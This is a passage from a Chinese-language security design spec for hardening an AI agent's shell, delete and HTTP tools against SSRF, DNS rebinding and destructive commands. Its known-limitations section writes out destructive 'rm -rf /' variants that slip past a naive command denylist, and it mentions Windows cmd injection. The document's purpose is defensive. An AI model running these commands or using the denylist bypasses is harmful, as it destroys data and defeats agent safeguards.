`rust/layer3/tests/ssrf_integration.rs`（新建）：

- 用 `wiremock`（workspace 已依赖）模拟 metadata IP 拒绝
- 测试 redirect 链到 localhost 被截断
- 测试 DNS rebinding 攻击向量（mock DNS resolver）

---

## 7. 已知局限

### 7.1 DNS rebinding 部分缓解

TOCTOU：`validate()` DNS 查询返回公网 IP，但 `reqwest` 内部再次 DNS 解析可能返回不同 IP。**完整修复**需要：
- 自定义 DNS resolver
- 把解析后的 IP 直接连接（绕过二次解析）
- 这需要 patch reqwest 或使用 `hyper` 底层 API

**当前缓解**：在 `DefaultUrlValidator::validate` 中如果 host 是域名（非 IP 字面量），DNS 解析后**双重检查**所有返回的 IP。如果域名 TTL 极短（< 1s），记录 warning 但不阻止。

**决定**：v1.1.0 标注已知局限，完整修复留 v1.2.0。

### 7.2 trash crate 跨平台差异

- macOS / Windows：调用系统 API，可靠
- Linux：依赖 XDG Trash 规范，桌面环境缺失时降级到永久删除 + 警告
- 容器内运行：通常无 trash，**降级为永久删除 + 日志告警**（生产场景预期）

### 7.3 命令 denylist 不完整

朴素字符串匹配可被绕过（`rm  -rf  /`、`rm -rf $'/'`、`r""m -rf /`）。**完整修复**需要 shell AST 解析。当前 denylist 仅阻止最常见的"明显错误"模式，**作为最后一道防线，不是主要安全机制** — 主要安全机制是 Layer 0 sandbox。

### 7.4 Windows shell 注入

`cmd /C <string>` 在 Windows 上对特殊字符（`&`、`|`、`>`）敏感。**不修复** — 改为 arg 数组会破坏 pipe 语义。Agent 应在 sandbox 内运行。

---

## 8. 风险与回退

| 风险 | 缓解 |
|------|------|
| `block_private_ips=true` 默认导致内网开发场景失败 | 文档明示；用户可在 config 中关闭 |
| trash 依赖新增 ~200KB 编译时间 | 必要代价；收益远超 |
| `UrlValidator` 增加 ~5ms 延迟（DNS 查询） | 与 HTTP 请求秒级延迟相比可忽略 |
| denylist 误报 | 提示用户用 `force=true`（bash 不提供，delete 提供） |
| `reqwest::redirect::Policy::limited(0)` 等价拒绝所有 redirect | 文档说明用户需要 redirect 时显式设置 |

**回退方案**：所有 `ToolLimits` 字段提供 `Default`，回退到当前行为只需设：
```rust
ToolLimits {
    max_bash_output_bytes: u64::MAX,
    max_delete_bytes: u64::MAX,
    block_private_ips: false,
    // ...
}
```

---

## 9. 与既有 spec 的关系

| 维度 | companion `fileops-hardening` (v1.0.3) | 本 spec (v1.0.4 + v1.1.0) |
|------|--------------------------------------|--------------------------|
| 范围 | Read/Write/Edit/ListDirectory | Bash/Delete/HTTP/WebFetch/Download/Ping/DNS |
| 共享配置 | `FileOpsLimits`（v1.0.3 引入） | 扩展为 `ToolLimits`（v1.0.4 合并） |
| breaking change | 否（仅内部 struct 改造） | 是（`BashTool::new()` 等需改；公开 API 加字段） |
| 发布顺序 | 第 1 步 | 第 2 步 |

实施顺序：companion v1.0.3 → 本 spec v1.0.4 → stale-read v1.1.0。

---

## 10. 自评

1. **Placeholder scan**：无 TBD/TODO
2. **Internal consistency**：所有 `ToolLimits` 字段名前后一致；`safe_truncate_bytes` 在多处使用
3. **Scope check**：聚焦 P0 工具输入/输出边界 + SSRF。WebSocket/沙箱路径白名单显式排除
4. **Ambiguity check**：
   - trash 失败时降级策略已明确（§7.2）
   - denylist 不完整已承认（§7.3）
   - DNS rebinding 部分缓解（§7.1）
5. **业界最佳实践对齐**：
   - SSRF 防护对齐 OWASP [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
   - 私有 IP 段定义对齐 [RFC 1918](https://datatracker.ietf.org/doc/html/rfc1918) + [RFC 3927](https://datatracker.ietf.org/doc/html/rfc3927)（link-local）
   - Metadata endpoint 列表覆盖 AWS/GCP/Azure/Alibaba/Tencent（业界主流云）
   - trash 机制对齐 macOS `NSWorkspace_recycleURLs` / Windows `IFileOperation::DeleteItem` / Linux XDG Trash spec
